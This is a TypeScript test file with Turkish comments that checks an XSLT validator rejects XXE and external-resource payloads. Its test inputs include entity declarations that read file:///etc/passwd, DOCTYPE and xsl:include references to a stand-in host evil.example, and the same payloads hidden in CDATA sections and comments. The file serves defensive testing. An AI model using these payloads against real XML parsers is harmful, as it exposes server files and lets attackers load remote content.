import assert from 'node:assert/strict';
import { XsltEngineService } from '../services/xsltEngineService';
import { normalizeXsltForBrowser } from '../services/xsltCompatibility';

/**
 * XSLT GÜVENLİĞİ — DIŞ VARLIK / DTD (XXE) REDDİ — 2026-09-26
 * ==========================================================================
 * Dışarıdan yüklenen XSLT dosyası kullanıcı girdisidir. Şablonun dosya
 * sistemi veya ağ kaynağı gösterme girişimi:
 *
 *   <!ENTITY f SYSTEM "file:///etc/passwd">
 *   <!DOCTYPE xsl:stylesheet SYSTEM "http://evil.example/dtd">
 *   <xsl:include href="http://evil.example/x.xslt"/>
 *
 * Tarayıcı `DOMParser`'ı harici DTD indirmediği için tarayıcı tarafında
 * sömürülemez; ancak bu dosyalar SESSİZCE kabul edilmemelidir. İleride sunucu
 * tarafında gerçek bir XML ayrıştırıcı devreye girerse doğrudan açık olur.
 *
 * KURAL: Bu dosyalar kaydedilmez. Hata mesajı "Güvenlik" ile başlar ve
 * hangi kalıbın bulunduğunu söyler — genel bir "geçersiz XML" değildir.
 *
 * Ayrıca CDATA veya yorum içine gizleme GİRİŞİMİ de reddedilir: gizlemenin
 * kendisi niyeti gösterir ve tarayıcı motoru bu blokları atlar.
 */

let passed = 0;
let failed = 0;

function test(name: string, fn: () => void) {
  try {
    fn();
    passed++;
    console.log(`PASS: ${name}`);
  } catch (err: any) {
    failed++;
    console.error(`FAIL: ${name}`);
    console.error(`      ${err?.message || err}`);
  }
}

/** Minimal, kendi kendine yeterli geçerli şablon — kontrol grubu. */
const CLEAN = `<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html><body><xsl:value-of select="//cbc:ID"/></body></html>
  </xsl:template>
</xsl:stylesheet>`;

const withDoctype = (doctype: string) => `${doctype}\n${CLEAN.replace('<?xml version="1.0" encoding="UTF-8"?>', '')}`;

// ── 1. Kontrol: temiz şablon hâlâ geçerli olmalı ──────────────────────────
test('temiz XSLT geçerli kabul edilir (sertleştirme yanlış pozitif üretmiyor)', () => {
  const r = XsltEngineService.validateXslt(CLEAN);
  assert.equal(r.valid, true, `beklenen geçerli, gelen: ${JSON.stringify(r)}`);
});

test('temiz dosyada externalEntityViolations boştur', () => {
  const n = normalizeXsltForBrowser(CLEAN);
  assert.deepEqual(n.externalEntityViolations, []);
});

// ── 2. DTD dış varlık bildirimi ───────────────────────────────────────────
test('<!ENTITY ... SYSTEM "file://..."> reddedilir', () => {
  const x = withDoctype('<!DOCTYPE x [<!ENTITY f SYSTEM "file:///etc/passwd">]>');
  const r = XsltEngineService.validateXslt(x);
  assert.equal(r.valid, false);
  assert.match(r.error || '', /Güvenlik/);
});

test('<!DOCTYPE ... SYSTEM "http://..."> reddedilir', () => {
  const x = withDoctype('<!DOCTYPE xsl:stylesheet SYSTEM "http://evil.example/dtd">');
  const r = XsltEngineService.validateXslt(x);
  assert.equal(r.valid, false);
  assert.match(r.error || '', /Güvenlik/);
});

test('<!DOCTYPE ... PUBLIC ...> reddedilir', () => {
  const x = withDoctype('<!DOCTYPE xsl:stylesheet PUBLIC "-//X//DTD//EN" "http://evil.example/dtd">');
  const r = XsltEngineService.validateXslt(x);
  assert.equal(r.valid, false);
  assert.match(r.error || '', /Güvenlik/);
});

// ── 3. Dış şablon içe aktarma ────────────────────────────────────────────
test('<xsl:include href="http://..."> reddedilir', () => {
  const x = CLEAN.replace('<xsl:template', '<xsl:include href="http://evil.example/x.xslt"/>\n  <xsl:template');
  const r = XsltEngineService.validateXslt(x);
  assert.equal(r.valid, false);
  assert.match(r.error || '', /Güvenlik/);
});

test('<xsl:import href="file://..."> reddedilir', () => {
  const x = CLEAN.replace('<xsl:template', '<xsl:import href="file:///etc/x.xslt"/>\n  <xsl:template');
  const r = XsltEngineService.validateXslt(x);
  assert.equal(r.valid, false);
  assert.match(r.error || '', /Güvenlik/);
});

// ── 4. Gizleme girişimleri ────────────────────────────────────────────────
test('CDATA içine gizlenen <!ENTITY SYSTEM> yine reddedilir', () => {
  const x = CLEAN.replace('<html>', '<![CDATA[<!ENTITY f SYSTEM "file:///etc/passwd">]]><html>');
  const r = XsltEngineService.validateXslt(x);
  assert.equal(r.valid, false);
  assert.match(r.error || '', /Güvenlik/);
});

test('yorum içine gizlenen <!ENTITY SYSTEM> yine reddedilir', () => {
  const x = CLEAN.replace('<html>', '<!-- <!ENTITY f SYSTEM "file:///etc/passwd"> --><html>');
  const r = XsltEngineService.validateXslt(x);
  assert.equal(r.valid, false);
  assert.match(r.error || '', /Güvenlik/);
});

// ── 5. Hata mesajı hangi kalıbı bulduğunu söylemeli ───────────────────────
test('hata mesajı bulunan kalıbı adlandırır (jenerik "geçersiz XML" değil)', () => {
  const x = withDoctype('<!DOCTYPE x [<!ENTITY f SYSTEM "file:///etc/passwd">]>');
  const r = XsltEngineService.validateXslt(x);
  assert.match(r.error || '', /ENTITY|DOCTYPE|içe aktarma/);
});

console.log(`\nXSLT güvenlik: ${passed} PASS / ${failed} FAIL`);
if (failed > 0) process.exit(1);
